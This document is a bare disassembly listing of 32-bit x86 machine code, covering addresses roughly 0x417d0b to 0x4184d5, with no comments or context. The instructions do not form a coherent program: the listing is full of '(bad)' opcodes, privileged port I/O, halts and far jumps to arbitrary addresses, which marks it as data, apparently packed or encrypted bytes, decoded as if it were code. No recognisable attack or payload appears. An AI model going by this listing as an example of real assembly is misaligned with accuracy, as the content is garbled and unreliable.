  417d0b:	mov    DWORD PTR [ecx+ebx*4-0x6c],esp
  417d0f:	push   cs
  417d10:	mov    DWORD PTR ds:0x155cb374,esi
  417d16:	repz fs push esp
  417d19:	shr    ebx,0x45
  417d1c:	xor    al,0xb3
  417d1e:	jns    0x417d6e
  417d20:	ror    DWORD PTR [ebx-0x7c822a31],cl
  417d26:	ds push ecx
  417d28:	enter  0x5d3d,0x64
  417d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d2d:	dec    ebx
  417d2e:	cwde   
  417d2f:	mov    ds:0x943432ae,al
  417d34:	and    al,0x69
  417d36:	shr    DWORD PTR [eax-0x5e6942d3],cl
  417d3c:	scas   al,BYTE PTR es:[edi]
  417d3d:	xchg   esp,eax
  417d3e:	add    edx,DWORD PTR [esi+0x37f40bc3]
  417d44:	jo     0x417d75
  417d46:	dec    DWORD PTR [esi-0x2]
  417d49:	aas    
  417d4a:	dec    esi
  417d4b:	pop    ecx
  417d4c:	ds push esp
  417d4e:	in     eax,0x3d
  417d50:	adc    edi,0xbc596cfa
  417d56:	and    dh,BYTE PTR [edi+0x20]
  417d59:	adc    BYTE PTR [ebp+0xd],bh
  417d5c:	pop    edx
  417d5d:	dec    esp
  417d5e:	ins    BYTE PTR es:[edi],dx
  417d5f:	fwait
  417d60:	sub    al,0xf2
  417d62:	push   esp
  417d63:	xor    eax,0x447d1231
  417d68:	mov    al,0x58
  417d6a:	add    eax,0x17fccaed
  417d6f:	pop    ds
  417d70:	xor    ah,BYTE PTR [ebp+ebx*2-0x1d]
  417d74:	aas    
  417d75:	pop    es
  417d76:	ret    
  417d77:	pop    edi
  417d78:	sub    al,0xfa
  417d7a:	push   ebp
  417d7b:	sti    
  417d7c:	inc    ebx
  417d7d:	nop
  417d7e:	cld    
  417d7f:	inc    esi
  417d80:	push   es
  417d81:	fwait
  417d82:	cdq    
  417d83:	xor    ch,BYTE PTR [esi+0x1592419]
  417d89:	xchg   ebx,eax
  417d8a:	dec    ebp
  417d8b:	ficomp DWORD PTR [ecx+0x26a90e62]
  417d91:	xchg   ebx,eax
  417d92:	call   0xa3f0:0xe59767f
  417d99:	sbb    eax,0x70c8ac9b
  417d9e:	fdivp  st(0),st
  417da0:	das    
  417da1:	sub    al,0x55
  417da3:	xchg   edi,eax
  417da4:	sub    edi,DWORD PTR [edi+0x1b5570e2]
  417daa:	xchg   edx,eax
  417dab:	and    ecx,DWORD PTR [edi]
  417dad:	cmc    
  417dae:	push   edx
  417daf:	out    dx,eax
  417db0:	push   0xffffff80
  417db2:	leave  
  417db3:	arpl   WORD PTR [ecx],bx
  417db5:	cwde   
  417db6:	jns    0x417da8
  417db8:	push   eax
  417db9:	mov    eax,0x6da2d331
  417dbe:	fisub  WORD PTR [esi+0x73]
  417dc1:	xor    eax,0x1e757611
  417dc6:	push   esi
  417dc7:	dec    ebp
  417dc8:	data16 xchg BYTE PTR ds:0x48e748aa,cl
  417dcf:	or     al,0xd9
  417dd1:	mov    ds:0xbab37ef7,al
  417dd6:	iret   
  417dd7:	lahf   
  417dd8:	cmp    al,0x6d
  417dda:	jnp    0x417d6b
  417ddc:	or     ecx,esi
  417dde:	lods   al,BYTE PTR ds:[esi]
  417ddf:	popa   
  417de0:	cmp    dh,BYTE PTR [eax+0x269bca0a]
  417de6:	(bad)  
  417de7:	mov    esp,0xa9756db5
  417dec:	out    0xd7,eax
  417dee:	(bad)  
  417def:	(bad)  
  417df0:	sub    al,0x92
  417df2:	xchg   esp,eax
  417df3:	std    
  417df4:	jle    0x417e53
  417df6:	push   es
  417df7:	mov    ecx,0x98cbd02e
  417dfc:	pop    esp
  417dfd:	cli    
  417dfe:	sub    eax,0xd075b06c
  417e03:	jmp    FWORD PTR [ebp+0x4e9aae01]
  417e09:	jmp    0x8814:0x6d228ec3
  417e10:	mov    ebx,DWORD PTR [edi]
  417e12:	hlt    
  417e13:	add    eax,0x6e86653a
  417e18:	xchg   edi,eax
  417e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e1a:	rcl    ebp,cl
  417e1c:	(bad)  
  417e1d:	jbe    0x417e43
  417e1f:	ss push esp
  417e21:	(bad)  
  417e22:	fcomp  QWORD PTR [edi+0x14]
  417e25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e26:	dec    ecx
  417e27:	or     eax,0x81fbe18b
  417e2c:	xchg   esi,eax
  417e2d:	mov    BYTE PTR [ebx],cl
  417e2f:	(bad)  
  417e30:	or     ah,BYTE PTR [ebx+0x1c]
  417e33:	rcr    dl,cl
  417e35:	fsubr  DWORD PTR [edx]
  417e37:	out    0x67,al
  417e39:	push   eax
  417e3a:	mov    bl,0x4c
  417e3c:	test   dh,bh
  417e3e:	dec    ebp
  417e3f:	loope  0x417e3b
  417e41:	ins    BYTE PTR es:[edi],dx
  417e42:	inc    ecx
  417e43:	cmp    edi,ecx
  417e45:	out    dx,eax
  417e46:	mov    ds:0xa5696a67,eax
  417e4b:	adc    ecx,esp
  417e4d:	(bad)  [esi+0x6a]
  417e50:	ficom  DWORD PTR [esi+edx*2]
  417e53:	hlt    
  417e54:	mov    ebx,0x70a9155c
  417e59:	ins    BYTE PTR es:[edi],dx
  417e5a:	scas   al,BYTE PTR es:[edi]
  417e5b:	sub    al,0xac
  417e5d:	xchg   ebp,eax
  417e5e:	sahf   
  417e5f:	xlat   BYTE PTR ds:[ebx]
  417e60:	ret    
  417e61:	mov    DWORD PTR [ecx-0x38581efb],ecx
  417e67:	dec    eax
  417e68:	jae    0x417e82
  417e6a:	pop    ds
  417e6b:	jecxz  0x417e58
  417e6d:	popa   
  417e6e:	int3   
  417e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e70:	stos   BYTE PTR es:[edi],al
  417e71:	loopne 0x417ec4
  417e73:	cmc    
  417e74:	hlt    
  417e75:	jp     0x417eb2
  417e77:	mov    esp,0xf4c5e371
  417e7c:	and    ch,ah
  417e7e:	scas   al,BYTE PTR es:[edi]
  417e7f:	mov    edi,0x9c76ba1f
  417e84:	cmp    eax,0x44d76eff
  417e89:	and    BYTE PTR [edx-0x56601e23],dl
  417e8f:	clc    
  417e90:	push   esp
  417e91:	push   ecx
  417e92:	mov    eax,ds:0x958df376
  417e97:	dec    ecx
  417e98:	cmp    ch,BYTE PTR [eax]
  417e9a:	retf   0x37c5
  417e9d:	clc    
  417e9e:	mov    al,ds:0x90b46053
  417ea3:	adc    DWORD PTR [edi+esi*8-0x14],0xb3ec1d25
  417eab:	lea    edx,[ebx+0x3e47c07d]
  417eb1:	loopne 0x417e8a
  417eb3:	imul   ebp,DWORD PTR [esi],0x7e
  417eb6:	push   edi
  417eb7:	fiadd  WORD PTR [esi+0x6c404c24]
  417ebd:	jb     0x417e9e
  417ebf:	pop    ds
  417ec0:	push   ebx
  417ec1:	cdq    
  417ec2:	stos   BYTE PTR es:[edi],al
  417ec3:	fstp   TBYTE PTR [eax]
  417ec5:	and    eax,0xc3d47f4b
  417eca:	mov    BYTE PTR [ebx+0x32c3d1b3],al
  417ed0:	inc    ebp
  417ed1:	out    dx,eax
  417ed2:	retf   
  417ed3:	mov    bl,0x94
  417ed5:	pop    ebp
  417ed6:	cld    
  417ed7:	inc    ebx
  417ed8:	popf   
  417ed9:	int    0x75
  417edb:	cdq    
  417edc:	pop    edi
  417edd:	pop    esi
  417ede:	jmp    0x3270ba06
  417ee3:	cmp    al,0x9e
  417ee5:	jg     0x417e84
  417ee7:	pushf  
  417ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ee9:	mov    al,0x38
  417eeb:	pop    edi
  417eec:	arpl   WORD PTR [esi-0x49],bp
  417eef:	jmp    0xdffd43e6
  417ef4:	and    al,BYTE PTR [ebx+0x55fdfb19]
  417efa:	dec    ecx
  417efb:	das    
  417efc:	jg     0x417f18
  417efe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eff:	xlat   BYTE PTR ds:[ebx]
  417f00:	fstp   TBYTE PTR [ebx]
  417f02:	neg    DWORD PTR [esi]
  417f04:	dec    esp
  417f05:	aas    
  417f06:	inc    ebx
  417f07:	or     eax,0xad51024
  417f0c:	fisubr WORD PTR [ecx-0x650e37a7]
  417f12:	inc    ebp
  417f13:	pop    esp
  417f14:	pusha  
  417f15:	cmp    al,0xdc
  417f17:	loop   0x417ef0
  417f19:	sbb    BYTE PTR [esp+edi*4-0x3ffa003b],al
  417f20:	inc    esi
  417f21:	and    DWORD PTR [eax],ebp
  417f23:	hlt    
  417f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f25:	cmp    esp,esi
  417f27:	mov    edi,0xb59f462a
  417f2c:	mov    edx,0xaf72d929
  417f31:	push   cs
  417f32:	cmp    DWORD PTR [ebp+0x7d],edx
  417f35:	ror    BYTE PTR [ebp+0x3104d399],cl
  417f3b:	shl    BYTE PTR [eax+0x3f],1
  417f3e:	pusha  
  417f3f:	iret   
  417f40:	ss push ss
  417f42:	enter  0x8b71,0xb8
  417f46:	sub    edx,DWORD PTR [edx+0x39]
  417f49:	sbb    al,0x4c
  417f4b:	cld    
  417f4c:	dec    ebp
  417f4d:	pop    ss
  417f4e:	xchg   ecx,eax
  417f4f:	mov    bh,bl
  417f51:	scas   al,BYTE PTR es:[edi]
  417f52:	or     DWORD PTR [edx+0x7efb84e5],ebp
  417f58:	ss enter 0x8674,0x1b
  417f5d:	ja     0x417ef6
  417f5f:	xor    BYTE PTR [ebx-0x5019c295],bh
  417f65:	add    BYTE PTR [ecx-0x47ee432f],0xc5
  417f6c:	cmp    eax,0x9aa55099
  417f71:	jmp    0xa868:0x8ffcf28f
  417f78:	push   edi
  417f79:	sub    esp,DWORD PTR [esp+esi*4]
  417f7c:	inc    eax
  417f7d:	repnz stc 
  417f7f:	xor    eax,0x80d92f44
  417f84:	sbb    eax,0x4208ab55
  417f89:	push   0xfffffffa
  417f8b:	stos   DWORD PTR es:[edi],eax
  417f8c:	xor    DWORD PTR [ecx-0x3d],eax
  417f8f:	jl     0x417f9d
  417f91:	or     DWORD PTR [edi+eiz*2],ebp
  417f94:	test   BYTE PTR [edx-0x4e],al
  417f97:	scas   eax,DWORD PTR es:[edi]
  417f98:	mov    ds:0x33634050,al
  417f9d:	mov    ebx,0x5cd60ddc
  417fa2:	inc    edx
  417fa3:	scas   eax,DWORD PTR es:[edi]
  417fa4:	repnz mov edx,0x627098cb
  417faa:	shr    DWORD PTR [eax-0x9ac7896],1
  417fb0:	adc    ebx,ebx
  417fb2:	test   DWORD PTR [eax+0xe],ecx
  417fb5:	pop    ebp
  417fb6:	fld    TBYTE PTR [edx+0x4748cc7e]
  417fbc:	or     eax,0x5328e5aa
  417fc1:	hlt    
  417fc2:	xchg   esi,eax
  417fc3:	(bad)  
  417fc4:	mov    ebx,0x511ed65a
  417fc9:	stos   DWORD PTR es:[edi],eax
  417fca:	push   ecx
  417fcb:	rcl    edx,cl
  417fcd:	je     0x417fca
  417fcf:	in     al,0x1a
  417fd1:	or     eax,0x952bb604
  417fd6:	test   al,0x48
  417fd8:	aad    0x97
  417fda:	jmp    0xfbfc5ab7
  417fdf:	int3   
  417fe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fe1:	xor    bh,BYTE PTR [edx]
  417fe3:	add    al,0xcb
  417fe5:	mov    edx,0x2c019d75
  417fea:	leave  
  417feb:	retf   
  417fec:	pavgb  mm1,QWORD PTR [esi+0x7d]
  417ff0:	scas   eax,DWORD PTR es:[edi]
  417ff1:	popf   
  417ff2:	ret    0x9056
  417ff5:	lahf   
  417ff6:	lock outs dx,BYTE PTR es:[esi]
  417ff9:	lock mov bl,0x83
  417ffc:	mov    esp,0xa6541d1d
  418001:	cmp    eax,0x42bf3bb7
  418006:	fisubr WORD PTR [edx+0x57]
  418009:	pop    edx
  41800a:	and    ch,BYTE PTR ds:[esi+0x6f3763c1]
  418011:	push   es
  418012:	mov    ecx,esi
  418014:	sbb    eax,0x35f6995a
  418019:	and    cl,BYTE PTR [edx-0x27165320]
  41801f:	dec    ebx
  418020:	fsubr  DWORD PTR [ebp+0x7dfda4b7]
  418026:	in     eax,dx
  418027:	enter  0x5c7c,0xee
  41802b:	push   edi
  41802c:	aas    
  41802d:	lods   eax,DWORD PTR ds:[esi]
  41802e:	jb     0x418091
  418030:	jge    0x41806c
  418032:	xor    edx,0xc
  418035:	pop    eax
  418036:	rol    BYTE PTR [eax],cl
  418038:	in     al,dx
  418039:	sbb    DWORD PTR [esi+0x56e5f299],esi
  41803f:	cmp    BYTE PTR [ebx-0x7048cc20],ah
  418045:	add    ebx,DWORD PTR [edx]
  418047:	add    eax,0xc8507b97
  41804c:	jnp    0x418001
  41804e:	aam    0x72
  418050:	stos   DWORD PTR es:[edi],eax
  418051:	sbb    DWORD PTR [eax-0x18],edi
  418054:	imul   ecx,DWORD PTR [ebx+0x3515cfca],0xce552959
  41805e:	mov    ah,0x68
  418060:	hlt    
  418061:	inc    ebp
  418062:	jl     0x4180d0
  418064:	lahf   
  418065:	dec    eax
  418066:	outs   dx,DWORD PTR ds:[esi]
  418067:	mov    ch,0x3f
  418069:	sub    eax,0xf4e2f1ab
  41806e:	loopne 0x41800b
  418070:	mov    BYTE PTR [edx],bl
  418072:	push   ebx
  418073:	ret    0x6eda
  418076:	mov    esp,0xa0e47fc5
  41807b:	in     al,0xa4
  41807d:	mov    ecx,0x3e041f57
  418082:	adc    eax,0x5be27335
  418087:	jp     0x41805a
  418089:	inc    DWORD PTR [ebx]
  41808b:	bound  esp,QWORD PTR [edx-0x309e4f2f]
  418091:	jae    0x418054
  418093:	js     0x418090
  418095:	cld    
  418096:	push   cs
  418097:	jmp    0x976e08e1
  41809c:	mov    ecx,0xd24fcbbf
  4180a1:	ret    0x1c40
  4180a4:	out    0xc7,eax
  4180a6:	leave  
  4180a7:	(bad)  
  4180a8:	jmp    0x4fc9:0x85a6c3b3
  4180af:	test   DWORD PTR [edi],ecx
  4180b1:	mov    eax,ds:0xdfd31ab9
  4180b6:	repnz fistp QWORD PTR ds:0x94d6c0b3
  4180bd:	std    
  4180be:	ds push cs
  4180c0:	mov    edi,0x8c02ac3f
  4180c5:	(bad)  
  4180c6:	enter  0xe1b5,0xe2
  4180ca:	push   esi
  4180cb:	jb     0x418103
  4180cd:	jo     0x418061
  4180cf:	jp     0x4180ac
  4180d1:	pop    ds
  4180d2:	repz mov edi,0x3c4d8e7a
  4180d8:	int    0xa
  4180da:	fnsave [esi]
  4180dc:	fild   QWORD PTR [ecx-0x7b]
  4180df:	in     eax,0x60
  4180e1:	mov    dl,0x55
  4180e3:	jg     0x418095
  4180e5:	push   edi
  4180e6:	push   eax
  4180e7:	pop    esp
  4180e8:	popf   
  4180e9:	dec    esi
  4180ea:	repnz add edi,ecx
  4180ed:	mov    ds:0x116f9271,al
  4180f2:	inc    esp
  4180f3:	mov    BYTE PTR [edx+0x58],cl
  4180f6:	sahf   
  4180f7:	scas   al,BYTE PTR es:[edi]
  4180f8:	sbb    BYTE PTR [esi+0x3d],0x1a
  4180fc:	gs jne 0x418154
  4180ff:	dec    ebx
  418100:	out    dx,al
  418101:	jle    0x418084
  418103:	mov    bh,0x67
  418105:	cmp    DWORD PTR [ecx-0x3],ebx
  418108:	fdivr  QWORD PTR ds:0xb019eaec
  41810e:	ds aas 
  418110:	lahf   
  418111:	(bad)  
  418112:	lahf   
  418113:	sub    ebx,DWORD PTR [edi+0x77]
  418116:	sub    BYTE PTR [edi-0x76b8c6e7],0x42
  41811d:	jecxz  0x418186
  41811f:	sahf   
  418120:	fs sti 
  418122:	mov    ds:0xdc34ba36,eax
  418127:	mov    ebp,0x7913c12f
  41812c:	push   edx
  41812d:	shl    DWORD PTR [esi-0x5b7bc277],1
  418133:	sbb    eax,0xa2eaaa42
  418138:	or     BYTE PTR [ebx+0x3027182d],0xad
  41813f:	out    0xa5,eax
  418141:	lea    esi,[edi-0x3b]
  418144:	pop    eax
  418145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418146:	push   es
  418147:	mov    dh,0x48
  418149:	jg     0x41818d
  41814b:	mov    eax,0x8ab1a9b
  418150:	(bad)  
  418151:	mov    ds:0x7954b6e8,eax
  418156:	ins    BYTE PTR es:[edi],dx
  418157:	shl    DWORD PTR [edi-0x4013502d],1
  41815d:	cdq    
  41815e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41815f:	inc    eax
  418160:	pop    ebx
  418161:	add    dl,BYTE PTR [ecx-0x6974381d]
  418167:	in     eax,dx
  418168:	div    BYTE PTR [esi+ebp*8+0x364c18e]
  41816f:	ja     0x418134
  418171:	fidivr DWORD PTR [edi]
  418173:	int    0xef
  418175:	xchg   ecx,eax
  418176:	out    0x20,al
  418178:	inc    eax
  418179:	dec    esi
  41817a:	fmul   QWORD PTR [ecx+0x76]
  41817d:	push   ds
  41817e:	(bad)  
  418180:	addr16 mov esi,0xf6965ec5
  418186:	push   esi
  418187:	cmp    esi,DWORD PTR [ebx+0x69]
  41818a:	lods   eax,DWORD PTR ds:[esi]
  41818b:	(bad)  
  41818c:	dec    esp
  41818d:	jl     0x4181c1
  41818f:	inc    ebp
  418190:	adc    DWORD PTR [eax+0x4a49c3cd],edx
  418196:	mov    ds:0xbf49ca63,eax
  41819b:	xor    bh,BYTE PTR [ebp-0x103f29ea]
  4181a1:	jmp    0x4181b8
  4181a3:	fwait
  4181a4:	dec    ebx
  4181a5:	test   DWORD PTR cs:0x2f19d05e,ebx
  4181ac:	mov    ebp,0xd70956cb
  4181b1:	pop    ebx
  4181b2:	fs inc eax
  4181b4:	js     0x418155
  4181b6:	mov    dl,0xdf
  4181b8:	pop    es
  4181b9:	pushf  
  4181ba:	repz jno 0x41816f
  4181bd:	adc    ch,al
  4181bf:	lods   eax,DWORD PTR ds:[esi]
  4181c0:	xchg   edx,eax
  4181c1:	mov    eax,0x154ed2d3
  4181c6:	push   ss
  4181c7:	xchg   DWORD PTR [ebx+edi*1+0x6d844798],ebx
  4181ce:	sub    BYTE PTR [esi-0x748c86b],dh
  4181d4:	xor    BYTE PTR ds:0xf8125911,al
  4181da:	jnp    0x4181c1
  4181dc:	pop    ebp
  4181dd:	in     eax,0xc3
  4181df:	pop    es
  4181e0:	and    BYTE PTR [eax+ebx*1-0x1f],dl
  4181e4:	(bad)  
  4181e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181e6:	sub    eax,0xf603c6aa
  4181eb:	jmp    0x860bf3da
  4181f0:	hlt    
  4181f1:	test   edi,edx
  4181f3:	out    dx,eax
  4181f4:	(bad)  
  4181f5:	xchg   DWORD PTR [esi-0x3582c035],edi
  4181fb:	adc    ebx,ebx
  4181fd:	sub    BYTE PTR [eax+eax*2],dh
  418200:	iret   
  418201:	mov    dl,dl
  418203:	scas   al,BYTE PTR es:[edi]
  418204:	pop    edi
  418205:	dec    ebp
  418206:	enter  0x3988,0x70
  41820a:	cli    
  41820b:	jae    0x418228
  41820d:	jmp    DWORD PTR [edi]
  41820f:	aaa    
  418210:	sub    bl,ch
  418212:	jnp    0x418237
  418214:	rol    DWORD PTR es:0xc4ff30c6,1
  41821b:	fwait
  41821c:	in     eax,dx
  41821d:	jne    0x41824b
  41821f:	mov    ch,0x8
  418221:	fwait
  418222:	js     0x418226
  418224:	lods   eax,DWORD PTR ds:[esi]
  418225:	shl    ch,cl
  418227:	sub    edi,DWORD PTR [esi+0x66]
  41822a:	and    DWORD PTR [esi-0x55f05f3],edi
  418230:	mov    dh,0xb8
  418232:	loope  0x41829c
  418234:	mov    edx,0x1c262d77
  418239:	in     al,dx
  41823a:	push   es
  41823b:	int3   
  41823c:	adc    dh,0x83
  41823f:	adc    al,0xf6
  418241:	mov    ecx,0xfa6f6045
  418246:	loop   0x41824e
  418248:	fisubr WORD PTR [ecx+esi*1+0x6c]
  41824c:	xchg   ebp,eax
  41824d:	pushf  
  41824e:	adc    ebx,DWORD PTR [eax+0x2b3590e2]
  418254:	xor    cl,BYTE PTR [ebx-0x2e]
  418257:	repnz mov ecx,0x14501958
  41825d:	mov    WORD PTR [edx],cs
  41825f:	call   0x15c7:0xa00b
  418265:	es jmp 0x41829c
  418268:	jge    0x418243
  41826a:	and    DWORD PTR [ebx+eiz*4],ebp
  41826d:	(bad)  
  41826f:	loope  0x418296
  418271:	mov    bh,0xe9
  418273:	push   ss
  418274:	pushf  
  418275:	sub    DWORD PTR [esi+0x6aa1727b],eax
  41827b:	jmp    0xcc57:0xd2f3336d
  418282:	xor    bh,BYTE PTR [eax+0x4f]
  418285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418286:	leave  
  418287:	jmp    0xe7082ec0
  41828c:	hlt    
  41828d:	rcr    BYTE PTR [esi+0x33],1
  418290:	rol    DWORD PTR [di-0x5d],0x4e
  418295:	sub    DWORD PTR [ecx],0xc46d5aaf
  41829b:	jg     0xd612897c
  4182a1:	pop    esp
  4182a2:	pusha  
  4182a3:	sub    ch,BYTE PTR [edi]
  4182a5:	mov    dh,0xe9
  4182a7:	std    
  4182a8:	sub    BYTE PTR [ebx],ch
  4182aa:	sti    
  4182ab:	in     al,0x55
  4182ad:	sbb    DWORD PTR [edx],esi
  4182af:	add    al,bh
  4182b1:	cld    
  4182b2:	aaa    
  4182b3:	jnp    0x41825d
  4182b5:	or     BYTE PTR ds:0xcdb1203d,ch
  4182bb:	mov    bh,0x72
  4182bd:	jae    0x418319
  4182bf:	mov    bh,0x3f
  4182c1:	in     eax,0xe3
  4182c3:	mov    ch,0xc3
  4182c5:	sar    al,cl
  4182c7:	rol    ebx,0xb6
  4182ca:	gs inc ebx
  4182cc:	scas   al,BYTE PTR es:[edi]
  4182cd:	or     eax,0x3593e9a7
  4182d2:	in     al,0x9c
  4182d4:	lds    ebx,FWORD PTR [ebp+edi*8+0x3d]
  4182d8:	sub    BYTE PTR [edx-0x706757e0],ah
  4182de:	daa    
  4182df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182e1:	scas   eax,DWORD PTR es:[edi]
  4182e2:	xchg   DWORD PTR [eax-0x3d],ecx
  4182e5:	pop    esp
  4182e6:	mov    ecx,0x108892f7
  4182eb:	push   edi
  4182ec:	and    esi,ebp
  4182ee:	xor    edi,DWORD PTR [edi+0x59]
  4182f1:	sbb    al,0xab
  4182f3:	ss aas 
  4182f5:	add    dl,BYTE PTR [ecx]
  4182f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182f8:	xchg   esp,eax
  4182f9:	inc    ecx
  4182fa:	and    edi,DWORD PTR [eax-0x5b795315]
  418300:	fdiv   DWORD PTR [ebx+0x7661a41f]
  418306:	sar    BYTE PTR [ebx],cl
  418308:	jne    0x4182c5
  41830a:	xchg   BYTE PTR [ebp+0x31721b24],dh
  418310:	add    al,0x8f
  418312:	jl     0x4182dc
  418314:	aad    0x9b
  418316:	sbb    ebx,DWORD PTR [ebx]
  418318:	sub    esp,DWORD PTR [edi+0x42]
  41831b:	cmp    BYTE PTR [ebx-0x1d],ah
  41831e:	loop   0x418318
  418320:	rcl    dh,1
  418322:	inc    ebp
  418323:	mov    ds:0xd9788622,al
  418328:	in     eax,0x48
  41832a:	out    0x7b,eax
  41832c:	push   ebp
  41832d:	sub    esp,DWORD PTR [esi]
  41832f:	xor    DWORD PTR [ebx],eax
  418331:	shl    DWORD PTR [edi+0x62635623],0x5a
  418338:	and    ecx,DWORD PTR [esi]
  41833a:	adc    ecx,ecx
  41833c:	mov    ds:0xdd536716,al
  418341:	iret   
  418342:	xchg   ebx,eax
  418343:	xor    esp,DWORD PTR [eax-0x419b007]
  418349:	or     eax,0xa72ba135
  41834e:	loope  0x418341
  418350:	or     DWORD PTR [edi+0x33],ebp
  418353:	and    al,0xb7
  418355:	pop    esp
  418356:	inc    esp
  418357:	leave  
  418358:	jg     0x4182f9
  41835a:	das    
  41835b:	cs push ecx
  41835d:	add    eax,0xbb05fb83
  418362:	pushf  
  418363:	cmp    BYTE PTR [edi],cl
  418365:	inc    esi
  418366:	push   ds
  418367:	jae    0x418391
  418369:	mov    ebx,0xa0218763
  41836e:	fld    TBYTE PTR [ecx+ebx*1-0x60104e2f]
  418375:	xchg   BYTE PTR es:[esi-0x5e5ac52b],bl
  41837c:	pop    eax
  41837d:	dec    eax
  41837e:	mov    ecx,0xa026e5d0
  418383:	inc    edi
  418384:	test   al,0x6e
  418386:	push   ebp
  418387:	jo     0x418396
  418389:	dec    ebx
  41838a:	inc    esi
  41838b:	(bad)  
  41838c:	ret    
  41838d:	sahf   
  41838e:	out    dx,eax
  41838f:	aas    
  418390:	cmc    
  418391:	mov    bl,0x4
  418393:	mov    bl,0xa4
  418395:	(bad)  
  418396:	ins    BYTE PTR es:[edi],dx
  418397:	lods   al,BYTE PTR ds:[esi]
  418398:	inc    ebp
  418399:	inc    edi
  41839a:	jmp    0x3fd05c9d
  41839f:	in     al,dx
  4183a0:	push   0x18
  4183a2:	icebp  
  4183a3:	pop    edx
  4183a4:	or     DWORD PTR [edx-0x70ede309],0xfd39c08c
  4183ae:	rcl    al,cl
  4183b0:	push   0x77
  4183b2:	sbb    edx,eax
  4183b4:	mov    bh,0xa2
  4183b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183b7:	stos   DWORD PTR es:[edi],eax
  4183b8:	push   ss
  4183b9:	lahf   
  4183ba:	nop
  4183bb:	in     al,0x21
  4183bd:	dec    edx
  4183be:	ins    BYTE PTR es:[edi],dx
  4183bf:	ins    DWORD PTR es:[edi],dx
  4183c0:	(bad)  
  4183c1:	inc    edx
  4183c2:	test   BYTE PTR [edi],dl
  4183c4:	mov    eax,ds:0x379c6c27
  4183c9:	mov    ebp,0x942444b6
  4183ce:	out    0xb1,eax
  4183d0:	cmp    BYTE PTR [edx+eax*8-0x44818f77],al
  4183d7:	inc    ecx
  4183d8:	mov    dl,0xd2
  4183da:	inc    esp
  4183db:	sbb    eax,0xc69ea635
  4183e0:	stc    
  4183e1:	jl     0x4183a4
  4183e3:	arpl   WORD PTR [edx+ecx*4],bp
  4183e6:	fdiv   QWORD PTR [edi]
  4183e8:	xor    ebx,ebp
  4183ea:	mov    BYTE PTR [edi*4+0x7557d0fb],0x2f
  4183f2:	shr    DWORD PTR [edi-0x6ec04547],1
  4183f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183f9:	inc    ebp
  4183fa:	and    al,0xbd
  4183fc:	stc    
  4183fd:	or     eax,0x7dbfbe1e
  418402:	popa   
  418403:	and    al,0x12
  418405:	out    dx,al
  418406:	cwde   
  418407:	or     DWORD PTR [edx-0x7d],ecx
  41840a:	xchg   ecx,eax
  41840b:	fcom   DWORD PTR [esi-0x11b4b1b5]
  418411:	and    BYTE PTR [eax-0xa],0xdd
  418415:	dec    ebx
  418416:	jae    0x41845a
  418418:	(bad)  
  418419:	xor    BYTE PTR [ebx-0x63],ah
  41841c:	and    DWORD PTR [eax+edx*4+0x2a],0x5fc46d93
  418424:	popa   
  418425:	inc    esi
  418426:	mov    dh,bh
  418428:	(bad)  
  418429:	frstor [esi+0x45308201]
  41842f:	jle    0x4183ea
  418431:	cs ret 
  418433:	out    dx,eax
  418434:	jnp    0x418457
  418436:	xor    BYTE PTR [ecx],bh
  418438:	ret    0x34d0
  41843b:	loop   0x418406
  41843d:	xchg   edx,eax
  41843e:	and    al,0x4c
  418440:	pop    ecx
  418441:	jne    0x4183fb
  418443:	nop
  418444:	out    0xfd,eax
  418446:	or     al,0xdf
  418448:	mov    al,0x39
  41844a:	jecxz  0x41845a
  41844c:	pop    edx
  41844d:	ret    0x10de
  418450:	(bad)  
  418451:	pop    eax
  418452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418453:	xor    dl,BYTE PTR [edi-0x33e57c21]
  418459:	int    0xec
  41845b:	add    DWORD PTR [ecx+0x5],0x3a7697a1
  418462:	bound  ecx,QWORD PTR [ecx-0x3f7d90e5]
  418468:	xchg   BYTE PTR [esp+ecx*1],dl
  41846b:	call   DWORD PTR [edx+eiz*8]
  41846e:	cmp    eax,0xbb5a2463
  418473:	add    DWORD PTR [eax+0xac135f0],ebp
  418479:	seta   BYTE PTR [edx+0x44083303]
  418480:	scas   eax,DWORD PTR es:[edi]
  418481:	mov    edx,0x7c6c5153
  418486:	retf   
  418487:	inc    ecx
  418488:	inc    edx
  418489:	adc    al,0x9f
  41848b:	fnclex 
  41848d:	cld    
  41848e:	adc    al,bh
  418490:	sub    al,0xbc
  418492:	fdiv   QWORD PTR [edx-0x4e4c42c6]
  418498:	loopne 0x4184c2
  41849a:	mov    ebx,0x5eeb7f6d
  41849f:	xchg   esp,eax
  4184a0:	(bad)  
  4184a1:	(bad)  
  4184a2:	aas    
  4184a3:	cmp    DWORD PTR [ecx],edx
  4184a5:	test   DWORD PTR ds:0xca540814,edx
  4184ab:	add    al,0x2b
  4184ad:	data16 ja 0x41848a
  4184b0:	mov    al,0xf9
  4184b2:	jmp    0x8837e466
  4184b7:	bnd jge 0x418478
  4184ba:	aaa    
  4184bb:	dec    bh
  4184bd:	scas   eax,DWORD PTR es:[edi]
  4184be:	ds and eax,ebp
  4184c1:	mov    edi,0xf96a9153
  4184c6:	sub    ah,BYTE PTR [eax+edi*8+0x7d24fdaf]
  4184cd:	mov    edi,edx
  4184cf:	pop    ss
  4184d0:	sub    BYTE PTR [ecx-0x58],bh
  4184d3:	cdq    
  4184d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184d5:	or     DWORD PTR [eax],0x70
